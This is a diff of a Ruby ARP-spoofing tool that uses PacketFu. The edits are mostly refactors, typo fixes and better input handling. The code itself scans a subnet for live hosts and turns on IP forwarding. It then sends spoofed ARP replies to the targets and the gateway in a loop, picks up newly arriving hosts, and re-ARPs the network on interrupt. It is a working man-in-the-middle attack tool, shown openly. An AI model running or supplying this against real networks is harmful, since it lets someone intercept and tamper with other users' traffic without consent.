@@ -68,10 +68,8 @@ else
   end
 end
 
-#----------------------------------------------------------------------#
+#------------------------------------------------------------------------------#
 # Assorted methods
-
-trap("INT") { neat_exit }
 
 def ip_check(ip)
   true if ip =~ /^(192|10|172)((\.)(25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9][0-9]|[0-9])){3}$/
@@ -83,10 +81,9 @@ end
 
 def target_parse(target)
   target = target.split(",")
-  @target = []                                          # Array of target ip's
-  @target = target.select {|ip| ip_check(ip)}           # Move single ips to @target
-  target.delete_if {|ip| ip_check(ip)}                  # Leaving range(s) in target
-  target.each do |range|                                # Separate range(s) into start and end addresses
+  @target = []                                           # Array of target ip's
+  @target, target = target.partition {|ip| ip_check(ip)} # Move single ips to @target, leaving range(s) in target. Don't you love Ruby?
+  target.each do |range|                                 # Separate range(s) into start and end addresses
     from  = range[/\A(\w*.){3}(\w*)/]     
     to    = range[/\A(\w*.){3}/] + range.split("-")[1]  
     ip_from   = IPAddr.new(from)
@@ -107,7 +104,7 @@ def build_pkt(dest_mac, source_ip, dest_ip, source_mac = @defaults[:eth_saddr], 
   @arp_pkt.arp_daddr_ip = dest_ip
 end 
 
-# Broadcast packets don't always work, best to directly target live hosts
+# Broadcast packets don't reliably work, best to directly target live hosts
 def target_scanner(targets, timeout)
   print "\nLooking for live targets..." if @verbose
   @targets_hash = {}
@@ -117,7 +114,7 @@ def target_scanner(targets, timeout)
     targets.each do |ip|
       threads << Thread.new do
         @targets_hash[ip] = PacketFu::Utils::arp(ip, :timeout => timeout, :iface => @iface)
-        @mutex.synchronize do                     # Mutex prevents mutiple threads writing to the screen at the same time
+        @mutex.synchronize do                     # Mutex prevents multiple threads writing to the screen at the same time
           if @targets_hash[ip]
             print "\n#{ip} \tmac is #{@targets_hash[ip]} " if @verbose
           elsif @verbose
@@ -129,7 +126,7 @@ def target_scanner(targets, timeout)
       sleep 0.07 # Absolutely crucial
     end
     threads.each { |thread| thread.join }          # Wait for all the child processes to finish
-  else
+  else #TODO: How to DRY out?
     targets.each do |ip|
       @targets_hash[ip] = PacketFu::Utils::arp(ip, :timeout => timeout, :iface => @iface)
       if @targets_hash[ip]
@@ -140,20 +137,18 @@ def target_scanner(targets, timeout)
       GC.start
     end
   end
-  @targets_hash.delete_if { |k, v| v.nil? }
+  @targets_hash.delete_if { |_, v| v.nil? }
   @targets_hash.delete(@gateway)
 end
 
 # Make arrays of packets for targets and gateway
 def make_packet_array(target_hash)
   if @two_way
-    @gateway_packets = [] unless @gateway_packets
     target_hash.each do |target, _|
       build_pkt(@gateway_mac, target, @gateway)
       @gateway_packets << @arp_pkt
     end
   end
-  @target_packets  = [] unless @target_packets
   target_hash.each do |target, target_mac|
     build_pkt(target_mac, @gateway, target)
     @target_packets << @arp_pkt
@@ -169,7 +164,7 @@ def arp_monitor
     @arp_cap = PacketFu::Capture.new(:iface => @defaults[:iface], :filter => "arp and not ether src #{@defaults[:eth_saddr]}")
     @arp_cap.stream.each do |p|
       @new_targets = {}   # start each loop empty
-      arp_pkt = PacketFu::Packet.parse p
+      arp_pkt = PacketFu::Packet.parse(p)
       ipaddr = arp_pkt.arp_saddr_ip
       if in_scope?(ipaddr) && ipaddr != @defaults[:ip_saddr] && !@targets_hash.include?(ipaddr) && ipaddr != @gateway
         if arp_pkt.arp_opcode == 1
@@ -179,7 +174,6 @@ def arp_monitor
             timeout += 2
           end
           @new_targets[ipaddr] = macaddr
-          puts_verbose("\nNew target arrived; #{ipaddr} ")
         elsif arp_pkt.arp_opcode == 2
           @new_targets[ipaddr] = arp_pkt.arp_saddr_mac
         end
@@ -197,7 +191,7 @@ end
 def neat_exit
   if @send_packets
     puts "\nRe-ARPing the network..."
-    @send_packets = false
+    @send_packets = false # Stop sending spoofed packets
     re_arp_pkts = []
     @targets_hash.each do |target, target_mac|
       build_pkt(target_mac, @gateway, target, @gateway_mac)
@@ -218,7 +212,9 @@ def neat_exit
   exit 0
 end
 
-#----------------------------------------------------------------------#
+trap("INT") { neat_exit }
+
+#------------------------------------------------------------------------------#
 # Let's set some defaults and variables
 
 if interactive
@@ -226,26 +222,32 @@ if interactive
   @verbose = true
 
   @defaults = PacketFu::Utils.ifconfig(Pcap.lookupdev)
-  @iface = @defaults[:iface] 
-  print "\nDefault interface appears to be #{@iface}.\nEnter to accept, or type an alternative: "
-  temp = gets.chomp
-  unless temp.empty?
-    @iface = temp
-    @defaults = PacketFu::Utils.ifconfig(@iface)               # Iface changed, therefore need new defaults
+  begin
+    @iface = @defaults[:iface] 
+    print "\nDefault interface appears to be #{@iface}.\nEnter to accept, or type an alternative: "
+    temp = gets.chomp
+    unless temp.empty?
+      @iface = temp
+      @defaults = PacketFu::Utils.ifconfig(@iface)               # Iface changed, therefore need new defaults
+    end
+  rescue ArgumentError
+    puts "!!! Invalid interface. Start again !!!"
+    sleep 1
+    retry
   end
 
   until ip_check(@gateway) do
     net = (`netstat -nr`).split(/\n/).select {|n| n =~ /UG/ }  # Find gateway by parsing netstat
     @gateway = ((net[0]).split)[1] 
     if ip_check(@gateway)
-    print "Gateway appears to be #{@gateway}.\nEnter to accept, or type an alternative IP: "
+      print "Gateway appears to be #{@gateway}.\nEnter to accept, or type an alternative IP: "
     else
       print "Unable to determine gateway. Please enter IP: "
     end
     temp = gets.chomp
     @gateway = temp unless temp.empty?
     unless ip_check(@gateway)
-      puts "Invalid IP address. Try again..."
+      puts "!!! Invalid IP address. Try again !!!"
       sleep 1
     end 
   end
@@ -317,9 +319,12 @@ if broadcast
 else
   var3 = target
 end 
-puts "\n#Spoofing #{var3} on #{@iface}, #{var2}"
+puts "\nSpoofing #{var3} on #{@iface}, #{var2}"
 
-#----------------------------------------------------------------------#
+@gateway_packets = []  
+@target_packets  = []
+
+#------------------------------------------------------------------------------#
 # Run the script
 
 puts_verbose("\nLooking for gateway...")
@@ -344,8 +349,8 @@ arp_monitor
 `echo 1 > /proc/sys/net/ipv4/ip_forward`
 @send_packets = true
 while @send_packets
-  print "\nSending spoofing packets to"
-  @targets_hash.each { |ip, _| print ", #{ip}" }
+  puts "\n\nSending spoofing packets to"
+  @targets_hash.each { |ip, _| print "; #{ip}" }
   print " and gateway #{@gateway}" if @two_way
   print "\nPackets sent: " if @verbose
   count = 0
@@ -360,7 +365,7 @@ while @send_packets
         count += 1
       end
     end
-    GC.start   # to deal with "memory leak" (more likely a problem calling GC)
+    GC.start   # to deal with "memory leak" (more likely a problem in calling the GC)
     print "#{count}, " if @verbose
     sleep 4
   end
